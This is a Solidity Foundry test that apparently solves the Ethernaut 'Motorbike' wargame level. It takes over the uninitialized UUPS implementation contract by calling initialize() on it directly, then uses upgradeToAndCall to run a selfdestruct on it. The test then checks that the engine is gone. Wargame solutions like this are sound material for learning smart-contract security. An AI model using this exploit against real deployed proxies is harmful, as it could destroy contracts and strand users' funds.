// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "./MotorbikeFactory.sol";

contract MotorbikeTest is Test {
    MotorbikeFactory factory;
    address motorbike;
    address engine;

    bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        factory = new MotorbikeFactory();

        motorbike = factory.createInstance(address(this));
        engine = address(uint160(uint256(vm.load(motorbike, _IMPLEMENTATION_SLOT))));

        Engine(engine).initialize();

        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
    }

    function done() public {
        selfdestruct(address(0));
    }

    function testMotorbike() public {
        assertTrue(!Address.isContract(engine));
        assertTrue(factory.validateInstance(payable(motorbike), address(this)));
    }
}
